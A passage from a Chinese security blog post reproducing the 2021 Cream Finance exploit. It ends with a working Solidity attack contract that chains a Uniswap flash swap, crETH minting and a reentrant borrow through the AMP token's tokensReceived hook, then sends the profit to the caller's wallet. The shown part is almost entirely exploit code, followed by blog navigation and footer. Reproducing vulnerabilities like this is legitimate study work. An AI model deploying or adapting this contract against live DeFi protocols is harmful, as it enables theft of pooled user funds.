class="line">    </span><br><span class="line">    address constant uin_WTH9_Pair_Address = 0xd3d2E2692501A5c9Ca623199D38826e513033a17;</span><br><span class="line">    </span><br><span class="line">    address constant WTH9_AMP_Pair_Address = 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;</span><br><span class="line">    </span><br><span class="line">    address constant WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;</span><br><span class="line">    </span><br><span class="line">    address constant crETH_Address = 0xD06527D5e56A3495252A528C4987003b712860eE;</span><br><span class="line">    </span><br><span class="line">    address constant crAMP_Address = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;</span><br><span class="line">    </span><br><span class="line">    address constant UniswapV2Router02_address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;</span><br><span class="line">    </span><br><span class="line">    address public wallet;</span><br><span class="line">    </span><br><span class="line">    ////这里必须是一个动态数组，根据uniswap的设计，该数组长度可能为2也可能为3</span><br><span class="line">    address[]  path = [0xfF20817765cB7f73d4bde2e66e067E58D11095C2,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        </span><br><span class="line">        //注册接口</span><br><span class="line">        IERC1820Registry(registry).setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));</span><br><span class="line">        </span><br><span class="line">        wallet = msg.sender;</span><br><span class="line">        //触发FlashSwap</span><br><span class="line">        Uni_Pair_V2(uin_WTH9_Pair_Address).swap(0, 500*1e18, address(this), &quot;0x00&quot;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external&#123;</span><br><span class="line">    </span><br><span class="line">        //把500个WETH转为500个ETH</span><br><span class="line">        WETH9(WETH9_Address).withdraw(500*1e18);</span><br><span class="line">        </span><br><span class="line">        //把500个ETH质押进Cream</span><br><span class="line">        crETH(crETH_Address).mint&#123;value:500*1e18&#125;();</span><br><span class="line">        </span><br><span class="line">        //这里很奇怪要先借小额的ETH,才能借出大量的AMP,暂时不清楚原因</span><br><span class="line">        crETH(crETH_Address).borrow(1*1e18);</span><br><span class="line">        </span><br><span class="line">        //攻击者调用了这个函数,所以我也跟着调</span><br><span class="line">        crAMP(crAMP_Address).accrueInterest();</span><br><span class="line">        </span><br><span class="line">        //借大量AMP</span><br><span class="line">        crAMP(crAMP_Address).borrow(19480000000000000000000000);</span><br><span class="line">        </span><br><span class="line">        //把所有ETH转为WETH</span><br><span class="line">        WETH9(WETH9_Address).deposit&#123;value:address(this).balance,gas:40000&#125;();</span><br><span class="line">        </span><br><span class="line">        //Approve给RouterV2大量AMP,准备卖掉</span><br><span class="line">        AMP(AMPToken_Address).approve(UniswapV2Router02_address,19480000000000000000000000000);</span><br><span class="line">        </span><br><span class="line">        //卖掉AMP</span><br><span class="line">        Uni_Router_V2(UniswapV2Router02_address).swapExactTokensForTokens(19480000000000000000000000,1,path,address(this),block.timestamp);</span><br><span class="line">        </span><br><span class="line">        //归还FlashSwap</span><br><span class="line">        WETH9(WETH9_Address).transfer(uin_WTH9_Pair_Address,502*1e18);</span><br><span class="line">        </span><br><span class="line">        //剩余WETH转回给测试账户</span><br><span class="line">        WETH9(WETH9_Address).transfer(wallet,WETH9(WETH9_Address).balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function tokensReceived(</span><br><span class="line">        bytes4 functionSig,</span><br><span class="line">        bytes32 partition,</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external  &#123;</span><br><span class="line">        // 当该攻击合约收到AMP的时候,触发钩子函数，通过重入借出ETH</span><br><span class="line">        crETH(crETH_Address).borrow(354*1e18);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>Author：<a href="http://example.com">John Doe</a>
            <p>Link：<a href="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/">http://example.com/2021/12/09/Cream-8-30-Vul-Poc/</a>
            <p>Publish date：<a href="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/">December 9th 2021, 4:26:49 pm</a>
            <p>Update date：<a href="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/">December 9th 2021, 4:30:31 pm</a>
            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2021/12/09/Compound-Bug-Analysis/" title="Compound_Bug_Analysis">
                    <div class="nextTitle">Compound_Bug_Analysis</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2021/12/09/XSURGE-Vul-Poc/" title="XSURGE_Vul_Poc">
                    <div class="prevTitle">XSURGE_Vul_Poc</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
    
        
            
                <a href="//github.com/W2Ning" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">事件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6A"><span class="toc-number">2.0.1.</span> <span class="toc-text">攻击合约A</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6B"><span class="toc-number">2.0.2.</span> <span class="toc-text">攻击合约B</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.0.3.</span> <span class="toc-text">攻击步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.</span> <span class="toc-text">复现步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">核心攻击代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">完整攻击代码</span></a></li></ol></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 6
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2222 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/22</span>
            <a class="archive-post-title" href="/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/">重写一个</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2021 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/09</span>
            <a class="archive-post-title" href="/2021/12/09/DODO-Vul-Poc/">DODO_Vul_Poc</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/09</span>
            <a class="archive-post-title" href="/2021/12/09/XSURGE-Vul-Poc/">XSURGE_Vul_Poc</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/09</span>
            <a class="archive-post-title" href="/2021/12/09/Compound-Bug-Analysis/">Compound_Bug_Analysis</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/09</span>
            <a class="archive-post-title" href="/2021/12/09/MonoX-Vul-Poc/">MonoX_Vul_Poc</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/09</span>
            <a class="archive-post-title" href="/2021/12/09/Cream-8-30-Vul-Poc/">Cream_8_30_Vul_Poc</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMeta = {
        url: "http://example.com",
        root: "/",
        author: "John Doe"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20210823"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20210823"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20210823" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
